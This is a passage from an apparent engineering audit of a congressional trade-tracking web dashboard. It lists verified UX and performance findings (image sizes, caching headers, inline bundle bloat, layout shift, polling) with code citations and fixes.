#### 451. [P4] Anonymous desktop users have no theme control at all (Light/Dark/System lives only in the mobile hamburger and the signed-in menu); OS dark preference is ignored by default

- **Where:** Header account area  ·  **Surface:** Web · desktop  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** plausible (medium confidence)
- **What:** Dark mode exists and is well themed but a signed-out desktop visitor has no path to it (the hamburger is mobile-only), and the OS preference does nothing.  Keeping theme out of the header and light-as-default are recorded owner decisions, so this is about the missing alternative location, not the header.
- **Impact:** Comfort for night users; hidden feature.
- **Fix:** Offer a non-header entry point for signed-out desktop (e.g. a small footer "Appearance" link or the ⋯ menu), keeping light as the default per owner convention.
- **Evidence:** dashboardHtml.ts@origin/main:11594-11602 anonymous desktopHtml = Sign In + Upgrade only, with the comment "Theme stays out of the signed-out top bar (owner: it dumped Light/Dark/System into the header).  Default is light; theme lives in the hamburger."; themeRowHtml appears only in mobileHtml (:11608) and the signed-in menu; :1318 `.acct-mobile { display:none }` on desktop; :4096-4101 readThemePref defaults to 'light'.  dark/dm-trends-os-dark-default.png rendered light under prefers-color-scheme: dark (INDEX.md:150).
- **Panel:** web-ux-desktop — Facts confirmed, but the code comment at 11596-11598 records an explicit owner decision to keep theme out of the signed-out header and CONTEXT says light is the product default — downgraded P3→P4 and dropped the 'default to system' / 'add to header' recommendations. · `web-ux-desktop/WEBUXDESKTOP-30`

#### 452. [P4] Bare `/` lands returning visitors on their last-used tab from localStorage rather than a stable home

- **Where:** Boot (view resolution)  ·  **Surface:** Web  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** Someone who last looked at Delivery and later types congress.trade gets the Delivery gate as their landing page; the same bare URL shows different views to different people, which also complicates support ("go to congress.trade").
- **Impact:** Inconsistent entry experience; minor.
- **Fix:** Land `/` on Trends always; keep last-tab memory only for the PWA/standalone display mode if desired.
- **Evidence:** dashboardHtml.ts@origin/main:12770-12779 `var saved = localStorage.getItem('ct-active-tab'); … initialView = canonicalSaved;` when no `?view=`; :12065 every tab click stores it.  (PR #1967 made unknown `?view=` values fall back to Trends, but bare `/` still restores the saved tab.)
- **Panel:** web-ux-desktop — Boot code quoted; behaviour is deliberate (comment says 'restore the saved tab') so this is a preference call — P4 stands. · `web-ux-desktop/WEBUXDESKTOP-37`

#### 453. [P4] Trades default ordering by trade date buries newly-filed old trades; there is no "newest filings" mode or "filed today" indicator on desktop

- **Where:** Trades default sort  ·  **Surface:** Web · desktop  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** A filing posted today for a trade executed 40 days ago lands on page 3, so "what came in today" (the product's speed pitch) is invisible unless the user knows to open Columns and sort by Seen.
- **Impact:** Missed core value; power users cannot see the daily inflow.
- **Fix:** Offer a "Sort: Newest filings" preset (published desc) in the toolbar and restore a small "N filings today" stat.
- **Evidence:** dashboardHtml.ts@origin/main:3518 `var sortKey = 'txdate'`; :5285-5292 API sort tx_date desc by default; `kpiToday` referenced at :5300 but `grep -n 'id="kpiToday"'` finds no such element, so "filings imported today" is never shown; Seen/Official Filed columns default off (:4495, :4500).
- **Panel:** web-ux-desktop — sortKey default and orphaned kpiToday reference verified. · `web-ux-desktop/WEBUXDESKTOP-42`

#### 454. [P4] Directory carries a user-facing "Refresh" button that has no user purpose

- **Where:** Directory toolbar  ·  **Surface:** Web · desktop  ·  **Category:** ux  ·  **Effort:** S  ·  **Verdict:** confirmed (medium confidence)
- **What:** Reloading a cached roster is an operator concern; to a visitor it reads as "the data may be stale" and adds a control to a toolbar that lacks Party/sort controls users actually need.
- **Impact:** Minor clutter/confusion.
- **Fix:** Remove it (auto-refresh on tab open) or move it to the admin menu.
- **Evidence:** dashboardHtml.ts@origin/main:3074 `<button class="btn ghost sm" onclick="refreshDirectory()">Refresh</button>`; refreshDirectory (:9873-9876) just re-runs loadPeopleDirectory/loadAssetsDirectory.  desktop/directory.png shows it beside the branch select.
- **Panel:** web-ux-desktop — Markup and handler quoted. · merged: web-mobile/WEBMOBILE-27 · `web-ux-desktop/WEBUXDESKTOP-45`

#### 460. [P4] Trends is a 7,765px single page with 17 collapsible sections and no section index; fold state is not remembered

- **Where:** Trends  ·  **Surface:** Web · desktop  ·  **Category:** ux  ·  **Effort:** M  ·  **Verdict:** confirmed (medium confidence)
- **What:** Reaching Disclosure Timeliness or Committee Conflicts requires scrolling past a dozen sections every visit; collapsing sections is undone on reload.
- **Impact:** Long-page fatigue for returning users.
- **Fix:** Add a sticky mini table-of-contents (or jump chips) under the filter bar and persist open/closed per section.
- **Evidence:** desktop/trends-full.png is 1440×7765; trends-a11y.txt: 17 `<details>` sections (18 `<details` in the template); dashboardHtml.ts@origin/main:2154-2204 fold CSS only — `grep -n "'toggle'\|trends-fold"` in JS finds no toggle listener or localStorage key for fold state.
- **Panel:** web-ux-desktop — Image size and greps verified. · `web-ux-desktop/WEBUXDESKTOP-36`

#### 463. [P4] No side-by-side compare for politicians or tickers; leaderboards are the only comparison surface

- **Where:** Product-level  ·  **Surface:** Web · desktop  ·  **Category:** growth  ·  **Effort:** L  ·  **Verdict:** plausible (medium confidence)
- **What:** "Compare Pelosi vs Khanna" or "NVDA vs AMD congressional flow" is a common research question with no path beyond opening two drawers sequentially.
- **Impact:** Opportunity for engagement/shareable content.
- **Fix:** Allow pinning two entities from drawers into a compare panel (stats + performance + overlap of tickers).
- **Evidence:** No compare route/UI in dashboardHtml.ts (grep `compare` → no UI hits); Trends provides Top Performers / Most Active tables only (desktop/trends-full.png).
- **Panel:** web-ux-desktop — Feature-idea; absence confirmed, value not measurable here. · `web-ux-desktop/WEBUXDESKTOP-38`

### Web performance and caching (18)

A 715 KB uncacheable document with no build step, edge caching effectively off, CLS in the 'poor' band, and a font request that 400s on every page load.

#### 145. [P2] Ticker logos are 256x256 PNGs (up to 58 KB each) rendered in a 22 px box — logo images dominate Trades transfer

- **Where:** app/src/ui/tickerLogos.ts:82-85; app/src/ui/dashboardHtml.ts:4227  ·  **Surface:** Web  ·  **Category:** perf  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** logo.dev is asked for 128 px retina PNGs (256 px) and PNG is a poor format for gradient logos, so one 22 px logo can weigh more than the first page of trade JSON (8.8 KB gz).  Fifty visible rows × logo is the largest byte cost on the Trades tab and every Trends asset table.
- **Impact:** ~200 KB of images per Trades page on desktop; slow table pop-in on mobile data; multiplied by WEBPERF-03 (no edge cache) it is also origin/egress cost.
- **Fix:** Request `format=webp&size=48&retina=true` (96 px) from logo.dev, or transcode server-side to webp at 64-96 px; keep PNG only for the local pack.  Add `width`/`height` attributes to the `<img>`.  Expected 2-6 KB per logo (~10x smaller).
- **Evidence:** logs/desktop-trades-network.txt LARGEST: `/api/logos/ticker?symbol=ZBH 58,602 B`, `SPYM 48,976`, `ARCC 41,575`, `JPM 24,370`, `CCI 23,986`; ~40 image requests ≈ 205 KB of a ~414 KB Trades load.  Verifier live curl: ZBH → `PNG image data, 256 x 256, 8-bit/color RGB`, 58,277 B; NVDA 18,344 B.  origin/main app/src/ui/tickerLogos.ts:82 `?token=...&format=png&theme=${theme}&size=128&retina=true&fallback=404` (retina doubles 128→256).  CSS dashboardHtml.ts:477 `.tkr-logo { ... width: 22px; height: 22px; }` (36 px in cards :570, 34 px in drawer :620).  Member photos by contrast are ~6-7 KB webp.
- **Panel:** web-perf — Reproduced the 256x256 / 58 KB ZBH PNG live and confirmed the size=128&retina=true request and 22 px CSS box on origin/main. · `web-perf/WEBPERF-02`

#### 146. [P2] Trends analytics fetches are serialized behind /auth/me — the 14 requests only start after the auth round-trip completes

- **Where:** app/src/ui/dashboardHtml.ts:12746-12809  ·  **Surface:** Web  ·  **Category:** perf  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** The landing view's data is gated on an unrelated auth call, adding one full RTT (~150-300 ms measured, more on mobile) before any Trends numbers appear.  Only loadReview/loadPollConfig genuinely need `me`.
- **Impact:** Trends first-data/LCP is later than necessary on every landing; ~0.3-0.5 s on a 300 ms-RTT mobile connection.
- **Fix:** Call `loadTrends()` (or the resolved initial-view loader) synchronously at boot in parallel with `loadMe()`, keeping only `loadReview()/loadPollConfig()` inside the `.then`; the initial-view resolution itself does not depend on `me`.
- **Evidence:** origin/main dashboardHtml.ts:12747 `loadMe().then(function () { ... })` with `loadTrends(); // Trends is the default landing view` at :12809 inside that callback, while `loadTrades().then(function () { startStream(); openDeepLink(); })` at :12814 fires synchronously at boot.  Lens live resource timing on /?view=trends: `/auth/me` start 621 ms, duration 151 ms; every `/api/analytics/*` starts at 793-796 ms.  loadTrends (:9542) reads no ME state.
- **Panel:** web-perf — Code path verified at the cited lines; the timing waterfall is the lens's own live measurement and is consistent with the code. · `web-perf/WEBPERF-06`

#### 147. [P2] Header wordmark is a 1670x334 PNG (161 KB light / 136 KB dark) displayed at 40 px tall

- **Where:** app/src/ui/dashboardHtml.ts:2693  ·  **Surface:** Web  ·  **Category:** perf  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** The wordmark is ~8x oversized (needs ~400x80 at 2x DPR) and shipped as RGBA PNG; switching to dark theme fetches a second 136 KB copy.
- **Impact:** ~160 KB on the first-visit critical path (edge-cached, immutable, so repeat visits are free), a likely LCP element on mobile; theme toggle costs another 136 KB.
- **Fix:** Export the wordmark as an optimized SVG (a few KB, theme via `currentColor`) or a 400x80 / 800x160 webp with `srcset`; add `width`/`height` attributes and `fetchpriority="high"`.  Delete the unused Zilla Slab @font-face + asset (or actually use it as the text wordmark).
- **Evidence:** logs/headers.txt: `/assets/brand-logo-light.png?v=20 ... 161,298 B (cache HIT, immutable)`; verifier `file app/public/assets/brand-logo-light.png` → `PNG image data, 1670 x 334, 8-bit/color RGBA` (161,263 B on disk); brand-logo-dark.png 136,452 B.  origin/main dashboardHtml.ts:2693 `<img class="brand-logo" id="brandLogo" src="/assets/brand-logo-light.png?v=20" data-src-dark="/assets/brand-logo-dark.png?v=20" ... height="40" decoding="async">`; CSS :331 `.brand-logo { height:40px; width:auto; max-width:min(360px, 62vw) }`.  It is the largest static asset on the page and the only non-lazy image above the fold.  Separately, :327 declares `@font-face { font-family:'Zilla Slab'; ... src:url(/assets/zilla-slab-700.woff2) }` (26,100 B on disk) but no rule uses that family and no capture network log shows the woff2 being fetched — dead declaration, zero bytes.
- **Panel:** web-perf — Dimensions/sizes reproduced from the repo assets and headers log.  Corrected: the Zilla Slab woff2 is not downloaded (unused @font-face), so it is cleanup, not a byte cost. · merged: visual-design/VISUALDESIGN-32, web-mobile/WEBMOBILE-23 · `web-perf/WEBPERF-08`

#### 185. [P2] Cloudflare does not cache /api/logos/ticker, /api/photos/member, /api/analytics/* or /api/transactions (cf-cache-status DYNAMIC) — every image and analytics call goes to the Hetzner origin, and each logo request re-fetches logo.dev

- **Where:** app/src/ui/tickerLogos.ts:108; app/src/analytics/routes.ts (cached() KV layer only)  ·  **Surface:** Cross-surface  ·  **Category:** perf  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Only /api/members and /api/assets benefit from the edge.  Every ticker logo (dozens per page), every member photo, all 14 Trends analytics calls and every transactions page are origin round-trips (~200 ms cfOrigin), and each logo miss additionally makes the origin call logo.dev synchronously.  Browsers cache logos/photos (max-age) but first-visit and cross-visitor sharing is zero.
- **Impact:** Slower image pop-in and Trends population for every new visitor, avoidable origin CPU/egress on a single Deno box that showed 502 windows during capture, and a hard runtime dependency on logo.dev latency for every uncached image.
- **Fix:** (1) Extend the Cloudflare Cache Rule to `/api/logos/*`, `/api/photos/*`, `/api/analytics/*` (respect origin TTL, cache by full query string) and `/api/transactions` (15 s s-maxage already declared).  (2) Add `Cache-Control: public, s-maxage=<KV TTL>, stale-while-revalidate=300` to analytics responses so the rule can act.  (3) Add a small in-memory LRU (symbol → bytes, 24 h) in handleTickerLogoRequest so a cold edge does not mean a logo.dev fetch.  Verify with `cf-cache-status: HIT`.
- **Evidence:** Verifier live curls 2026-08-19: `/api/logos/ticker?symbol=ZBH` → `cache-control: public, max-age=86400, stale-while-revalidate=604800`, `x-logo-source: logo.dev`, `cf-cache-status: DYNAMIC` (repeatable); `/api/photos/member?key=P000197` → `max-age=31536000 ... DYNAMIC`; `/api/analytics/summary?window=90d` → NO cache-control header, DYNAMIC; `/api/transactions?limit=50&offset=0` → `s-maxage=15 ... DYNAMIC`; whereas `/api/members` and `/api/assets` → `cf-cache-status: EXPIRED` (i.e. edge-cached), so a Cache Rule exists for those two paths only.  origin/main tickerLogos.ts:175-178 passes `cf: { cacheTtl: ONE_WEEK_SECONDS, cacheEverything: true }` — a Workers-only fetch option, a no-op on Deno; no in-process memo in tickerLogos.ts or rest.ts:909-921.  analytics/routes.ts:211,242,278,490... use `cached(c.env, key, 120..1800, ...)` (KV) but only :1335 (latency-summary) sets a `Cache-Control` header.
- **Panel:** web-perf — All header observations reproduced live.  Corrected the prior-status claim: /api/assets is also edge-cached now, so this is broader new scope rather than a still-open item. · merged: ops-reliability/OPSRELIABILITY-05, api-contract/APICONTRACT-15 · `web-perf/WEBPERF-03`

#### 186. [P2] One 715 KB HTML document (~485 KB inline JS + ~160 KB inline CSS, unminified) is shipped to every visitor, including ~173 KB of admin/review-only JS and ~16 KB of admin markup

- **Where:** app/src/ui/dashboardHtml.ts:4507 (isAdminView gating, still inline)  ·  **Surface:** Web  ·  **Category:** perf  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** There is no code-splitting, no build step and no minification: the operator console (review queue, benchmark slots, backfill, source health, LLM spend) is parsed and compiled by every anonymous phone visitor, and roughly 20% of the document is comments and indentation.  On mid-range Android (4-6x slower than the test Mac, where domInteractive − responseEnd was 38-193 ms) parse+execute of ~485 KB of JS is an estimated 0.7-1.2 s main-thread block before any tab is interactive.
- **Impact:** Higher TTI/TBT and load-time INP on mobile, ~30-40 KB avoidable transfer per load, and slower iteration for agents editing a 12.8k-line template.
- **Fix:** Phase 1 (S): minify the extracted CSS/JS blocks with esbuild at build/boot — no behavior change.  Phase 2 (M): move `#view-review`/`#view-admin` markup and the review/admin/benchmark JS into `/assets/admin.js` + a template fragment fetched only when `canUseAdmin()` or `?view=admin|review`; lazy-load the Delivery form JS likewise.  Phase 3 (L, idea): split the remaining app into per-view `<script type=module>` chunks.
- **Evidence:** Verifier live curl `https://congress.trade/` → 715,277 B identity, 190,786 B br, 191,034 B gzip.  logs/page-metrics.txt: `inline JS bytes: 491882 ... inline CSS bytes: 160665 ... DOM nodes: 6869 ... decodedBodySize 722699`.  origin/main dashboardHtml.ts byte counts (verifier): script block 3481-12864 = 485,057 B; CSS 100-2687 = 162,800 B; `REVIEW` section 5636-6679 = 58,812 B + `ADMIN AUTH … SOURCE HEALTH` 7082-9282 = 114,357 B (173 KB of operator-only JS); `#view-admin` markup 3211-3425 = 15,696 B; `#view-review` 3097-3125 = 2,180 B.  No esbuild/minify step exists in app/package.json or ui/routes.ts.  Lens measurement: stripping comments/whitespace alone removes ~96 KB of JS and ~45 KB of CSS (~27 KB on the wire after brotli).  Anonymous a11y trees show the ADMIN_TOKEN password field pre-rendered on every view (NOTES.md (a)).
- **Panel:** web-perf — Sizes re-measured on origin/main; admin markup corrected from 19.8 KB to ~15.7 KB (the original range included the login/pricing modals).  Mobile CPU cost is an estimate (no device trace exists). · merged: seo-social/SEOSOCIAL-10, engineering-quality/ENGINEERINGQUALITY-18, web-mobile/WEBMOBILE-22 · `web-perf/WEBPERF-04`

#### 187. [P2] Desktop CLS is poor: 0.392 on Trends and 0.483 on Trades (Lighthouse), driven by the JS-sized Trades table and pre-data Trends sections

- **Where:** app/src/ui/dashboardHtml.ts (Trends/Trades render paths, unchanged)  ·  **Surface:** Web · desktop  ·  **Category:** perf  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Column widths are computed in JS after first paint so the desktop table paints narrow and jumps; Trends sections start as short 'Loading…' rows and grow when the 14 analytics calls resolve.  Good CLS is <0.1.
- **Impact:** Visible content jumps on every desktop load (Core Web Vitals 'poor'); clicks can land on the wrong row while the table re-lays out.
- **Fix:** Give the table CSS-driven default widths (`table-layout: fixed` + `<colgroup>` percentages, `width:100%`) so first paint is already full width and JS only adjusts on user drag; reserve `min-height` on Trends section bodies matched to their skeletons; add `width`/`height` to the brand logo.  Re-measure with Lighthouse desktop.
- **Evidence:** lighthouse/SUMMARY.txt: `trends-desktop ... FAIL cumulative-layout-shift ... 0.392`; `trades-desktop ... 0.483` (score 0.17); trends-mobile 0.051.  NOTES.md (g): Trades table first renders ~870 px wide then expands; Trends cards render before data.  origin/main dashboardHtml.ts:4557-4595 `syncTradesTableWidth()` reads `ths[i].offsetWidth`, writes `ths[i].style.width`, distributes leftover `wrap.clientWidth` to flex columns and sets `table.style.width = total + 'px'` — width is only correct after JS runs post-render; called from renderTrades (:4816) and resize (:12721).  Header `<img class="brand-logo" ... height="40">` (:2693) has no width attribute (CSS :331 `width:auto`).
- **Panel:** web-perf — Lighthouse numbers are in the capture; the JS-sizing mechanism is verified in code at the cited lines.  Mobile CLS is fine (0.051), so surface stays web-desktop. · merged: qa-bughunt/QABUGHUNT-26, seo-social/SEOSOCIAL-09, visual-design/VISUALDESIGN-33, web-ux-desktop/WEBUXDESKTOP-40 · `web-perf/WEBPERF-05`

#### 188. [P2] Assets directory renders all 4,212 rows (each with a lazy logo <img>) in one innerHTML and rebuilds them on every keystroke — scrolling can pull tens of MB of uncached logos

- **Where:** app/src/ui/dashboardHtml.ts:9941 (renderAssetsDirectory), :3067 (oninput=filterDirectory)  ·  **Surface:** Web  ·  **Category:** perf  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** A visitor who opens Assets and scrolls triggers thousands of logo requests (each an origin→logo.dev fetch on a cold edge), and each character typed rebuilds a 4,212-row table (hundreds of ms of main-thread work on mobile).
- **Impact:** Mobile data blow-up and janky typing on the Assets list; a burst of origin/logo.dev traffic per scrolling visitor.
- **Fix:** Paginate or virtualize the Assets/People lists on web as iOS now does (50 rows + pager, or IntersectionObserver 'load more'), debounce the search input (~150 ms), keep the roster in memory (already cached).  Pair with WEBPERF-02/03 so visible logos are small and edge-cached.
- **Evidence:** origin/main dashboardHtml.ts:9966-9985 `body.innerHTML = rows.map(function (a) { ... var logo = tkr ? tickerLogoHtml(tkr, nm) : ''; ...}).join('')` with no slice/limit; :9869 `function filterDirectory()` → `filterAssetsDirectory()` (:9990) bound to `<input id="peopleQ" ... oninput="filterDirectory()">` (:3067) with no debounce.  Verifier: no `dirPage`/`peoplePage`/`assetsPage`/slice logic exists in the web template — the 'Directory pager' in PR #1884 (cd30d4b9) touched only clients/ios (PeopleDirectoryView.swift, MemberDirectorySearch.swift).  `/api/assets` live: ~432 KB decoded ("4,212 rows" per docs/ux-findings-2026-08.md §7).  Each visible logo is a 10-58 KB PNG (WEBPERF-02) that bypasses the edge (WEBPERF-03).  Same pattern for People: :9787 renders every member with a lazy photo, rebuilt per keystroke by filterPeopleDirectory (:9828).
- **Panel:** web-perf — Verified the unbounded render and un-debounced oninput on origin/main; checked PR #1884 to rule out an existing web pager (it was iOS-only). · `web-perf/WEBPERF-09`

#### 301. [P3] HTML document has no Cache-Control, ETag or Last-Modified — every reload/return visit re-downloads ~190 KB and hits origin

- **Where:** GET / response headers, live  ·  **Surface:** Web  ·  **Category:** perf  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** With no validator the browser cannot revalidate (304) and Cloudflare cannot serve from the edge; the template is static per (logoDisplay, OG variant) yet is regenerated and re-transferred for every visit.
- **Impact:** ~190 KB and ~400 ms of body transfer on every reload/back-navigation, and origin load for every document request.
- **Fix:** Compute an ETag once per boot from the template hash + logoDisplay + OG values and answer 304 on `If-None-Match`; send `Cache-Control: no-cache` (or `public, s-maxage=60, stale-while-revalidate=300` for requests without `?member=`) so the edge can serve anonymous landings.  Pair with WEBPERF-16.
- **Evidence:** Verifier live curl `GET https://congress.trade/`: response headers contain `cf-cache-status: DYNAMIC` and no `cache-control`, `etag` or `last-modified`; body 715,277 B identity / 190,786 B br.  logs/headers.txt: "the HTML document carries no cache-control header at all".  origin/main app/src/ui/routes.ts:182 `r.get('/', async (c) => c.html(await renderDashboard(c.env, c.req.url)));` (and :183 for /admin) — only content-type is set.  Navigation timing: TTFB 180-279 ms + ~400 ms body (responseEnd 575-632 ms).
- **Panel:** web-perf — Header absence reproduced live; route handler verified on origin/main. · `web-perf/WEBPERF-10`

#### 302. [P3] renderTrades() builds BOTH the desktop table rows and the mobile card list on every render, on every device — and runs on every search keystroke and every poll with new rows

- **Where:** app/src/ui/dashboardHtml.ts:4779-4815 (approx)  ·  **Surface:** Web  ·  **Category:** perf  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Every render does double the string-building and DOM parsing (50 rows × N columns + 50 cards, each with logo/avatar markup), hidden variant included; typing re-runs it per character.
- **Impact:** Wasted main-thread time (tens of ms per render on mobile) at load, per keystroke (INP) and on every poll with new rows; two copies of the list in the DOM.
- **Fix:** Render only the variant matching `matchMedia('(max-width: 720px)')` (re-render on breakpoint change), debounce the keystroke render (~100 ms) or reuse the fetch debounce, and skip re-render on polls that add zero visible rows.
- **Evidence:** origin/main dashboardHtml.ts:4807-4813 `body.innerHTML = rows.map(...tds...)` then `if (cards) cards.innerHTML = rows.map(tradesCardHtml).join('');` (the `#tradesCards` element always exists; CSS hides one variant).  :5376-5380 `function handleTradesTextFilter() { tradesPage = 0; renderTrades(); ... setTimeout(function () { fetchPage(); syncFilterUrl(); }, 250); }` — the render is not debounced.  fetchUpdates (:5487-5516) calls `renderTrades()` whenever a poll returns rows; loadMe also calls renderTrades().  NOTES.md (f): mobile renders 50 `article.trades-card` cards with the table hidden.
- **Panel:** web-perf — All cited code verified on origin/main. · `web-perf/WEBPERF-11`

#### 303. [P3] Background 30 s poll of /api/transactions runs on every view (Trends, Directory, Delivery) to update a hidden Trades table

- **Where:** app/src/ui/dashboardHtml.ts:3512, :5531-5556, :5624-5632  ·  **Surface:** Web  ·  **Category:** perf  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** A visitor reading Trends or the Directory generates ~120 origin requests/hour to refresh a table they cannot see; the interval only pauses for hidden tabs.
- **Impact:** Radio wake-ups/battery on mobile, avoidable origin load per open tab, no benefit until the Trades tab is shown.
- **Fix:** Start/stop polling with the Trades view (or drop to a 2-5 min cadence off-tab with an immediate catch-up on tab switch).
- **Evidence:** logs/desktop-trends-network.txt:4: `Background poll: GET /api/transactions?from=2026-05-21&since=<lastId>&limit=50 fires every ~30 s (372 B transfer each), 13 poll requests recorded during ~6 min on the page` (Trends view); desktop-directory log shows the same poll returning 502s while on the member drawer.  origin/main dashboardHtml.ts:12814 `loadTrades().then(function () { startStream(); openDeepLink(); })` runs unconditionally at boot; :5531-5541 `startPolling` → `setInterval(..., POLL_INTERVAL_MS)` (:3512 = 30000) with no view gate; the only gate is `visibilitychange` (:5624).  (`setInterval(refreshSpeedUpdated, 60000)` at :12112 is a cheap textContent refresh, not a network call.)
- **Panel:** web-perf — Poll cadence observed in the capture and the ungated startPolling verified in code.  Dropped the refreshSpeedUpdated angle — it early-returns without data and only sets textContent. · `web-perf/WEBPERF-13`

#### 363. [P3] backdrop-filter: blur(16-22px) on every .card/.section/table (32 visible on Trends), the fixed mobile bottom tab bar and filter popovers — GPU cost with little visual payoff on mobile's flat background

- **Where:** app/src/ui/dashboardHtml.ts (19 backdrop-filter declarations, global CSS)  ·  **Surface:** Web · mobile  ·  **Category:** perf  ·  **Effort:** S  ·  **Verdict:** plausible (medium confidence)
- **What:** Each backdrop-filter forces its own compositing layer and a per-frame blur readback; the fixed blurred bottom bar re-blurs whatever scrolls under it every frame.  On low-end Android/iPhone SE this is a classic scroll-jank source, and over mobile's flat background the effect on cards is essentially invisible.
- **Impact:** Dropped frames while scrolling long Trends/Trades pages on mobile, higher battery use.
- **Fix:** Remove `backdrop-filter` from `.card/.section/table` at least under the mobile media query (keep the translucent `color-mix` fill); keep blur only for true overlays (dialogs, popovers); use an opaque `nav.tabs` background on `@media (hover:none)` instead of blur(20px).
- **Evidence:** logs/page-metrics.txt: `visible elements with backdrop-filter: 32` (desktop Trends).  origin/main dashboardHtml.ts:389 `.card { ... background: color-mix(in srgb, var(--panel) 75%, transparent); backdrop-filter: blur(16px); ... }`, :395 `table { ... backdrop-filter: blur(16px) ... }`, :670 `.section { ... backdrop-filter: blur(16px) ... }`, :1843-1844 mobile `nav.tabs { position: fixed; ... backdrop-filter: blur(20px) }`, :1496-1497 `.ios-filter-pop { backdrop-filter: saturate(180%) blur(22px) }`.  Mobile body (:1826) is flat `background: var(--bg)`; desktop body (:314) is a soft `radial-gradient(... var(--bg-2), var(--bg))`.
- **Panel:** web-perf — CSS verified; no mobile GPU trace exists so the jank claim is reasoned, not measured.  Clarified that desktop has a radial gradient (so some visual payoff there) — scoped to mobile. · `web-perf/WEBPERF-14`

#### 416. [P4] syncTradesTableWidth interleaves offsetWidth reads with style writes on first sizing, and un-throttled resize/capture-phase scroll listeners re-run DOM queries per event

- **Where:** Trades table sizing; window resize/scroll handlers  ·  **Surface:** Web · desktop  ·  **Category:** perf  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** The forced-layout loop is limited to the first sizing after each header render, so it is small; the recurring cost is the un-coalesced resize handlers and the capture-phase scroll listener that queries the DOM on every scroll frame even when no popover is open.
- **Impact:** Minor jank while resizing or dragging columns; small per-scroll-frame overhead on mobile.
- **Fix:** Batch reads before writes (or `getBoundingClientRect` once per header); coalesce resize handlers into one `requestAnimationFrame`-throttled function; make the scroll listeners early-return via a boolean 'popover open' flag instead of querying the DOM.
- **Evidence:** origin/main dashboardHtml.ts:4563-4567 loop: `var w = parsePx(ths[i].style.width) || ths[i].offsetWidth || minColWidth(...); ... ths[i].style.width = w + 'px';` — read→write→read per `<th>` forces a layout per column, but only while `style.width` is unset (after renderTradesHeader); on later calls parsePx short-circuits and only `wrap.clientWidth` (:4571) is read.  Called from renderTrades (:4816) and `window.addEventListener('resize', function () { syncTradesTableWidth(); applyColumnWidthClasses(); })` (:12721); three more resize listeners (:12436 syncChromeMetrics/repositionOpenIosFilters, :12463 forceTrendsFoldOpenAtDesktop) and two capture-phase scroll listeners (:12039 closeTip, :12435 repositionOpenIosFilters → `document.querySelectorAll('.ios-filter')` (:12349) on every scroll event of any scroll container).  `updateTradesCountMsg` does `void msg.offsetWidth` per render (:4853) to restart a CSS animation.
- **Panel:** web-perf — Code verified; downgraded to P4 because the read/write interleave only occurs while column widths are unset (parsePx short-circuits offsetWidth afterwards), so the steady-state cost is the listener overhead only. · `web-perf/WEBPERF-12`

#### 417. [P4] Deep-link landings (/?member=, /?ticker=, /?trade=) load the full Trends bundle (14 analytics + transactions + poll) underneath the drawer alongside the drawer's own data

- **Where:** Share-link entry points (OG cards → drawer)  ·  **Surface:** Web  ·  **Category:** perf  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** A visitor arriving from a shared card wants the drawer; the 17+ background requests compete for bandwidth and main thread with the drawer fetches and are wasted if they close after reading.
- **Impact:** Slower time-to-drawer-content on mobile share links, extra origin load per share click.
- **Fix:** When a deep-link param is present, open the drawer first and defer `loadTrends()`/polling to `requestIdleCallback` (or until the drawer closes); optionally pre-render the drawer's core numbers into the OG-tagged HTML.
- **Evidence:** logs/desktop-ticker-console-network.txt for /?ticker=NVDA: `GET /api/analytics/{summary,volume-over-time,ticker-leaderboard x2,trending,cluster-buys,sector-flow,market-cap-breakdown,member-performance,member-leaderboard,party-split,sector-breakdown,filing-lag,...}` plus `/api/analytics/ticker/NVDA?window=90d`, `/ticker/NVDA/backtest`, `/api/transactions...` and the poll.  origin/main dashboardHtml.ts:12809 loadTrends() runs for initialView 'trends' regardless of `?member/?ticker`; openDeepLink (:12544) runs after loadTrades (:12814).  ui/routes.ts:153-160 does a DB lookup per `?member=` document for OG meta.
- **Panel:** web-perf — Network log and boot code both verified. · `web-perf/WEBPERF-15`

#### 423. [P4] Trends eagerly fetches all 14 analytics endpoints (and all 14 again for every new chip/window combination) even for sections collapsed or below the fold; only the latency section is intersection-lazy

- **Where:** Trends view data loading  ·  **Surface:** Web  ·  **Category:** perf  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** Below-the-fold sections (conflicts, filing lag, party split, sector breakdown…) cost a request each on every load and every filter change whether or not the visitor scrolls to them.
- **Impact:** 14 parallel origin calls per Trends load/filter change (uncached at the edge, WEBPERF-03); more origin QPS and bandwidth on mobile.
- **Fix:** Reuse the latency-section IntersectionObserver pattern per Trends section (fetch when within ~300 px), and on filter change re-fetch only sections in/near view (others refetch on scroll).
- **Evidence:** origin/main dashboardHtml.ts:9542-9548 `function loadTrends() { stampWindowChips(); loadTrSummary(); loadTrTickers(); loadTrTrending(); loadTrClusters(); loadTrTime(); loadTrSectorFlow(); loadTrCapFlow(); loadTrPerformers(); loadTrMembers(); loadTrParties(); loadTrSectors(); loadTrLag(); loadTrConflicts(); }`; every chamber/party/side chip and window select calls `loadTrends()` (:11892, :12189-12190, :12290, :12314, :12415).  By contrast :12104-12111 wraps `renderSpeedProof()` in an IntersectionObserver with `rootMargin: '300px'`.  page-metrics: 17 `<details>` sections.  AGET_CACHE (:9331-9332) is a 60 s cache keyed by exact path, so each distinct filter combination fetches all 14 anew.
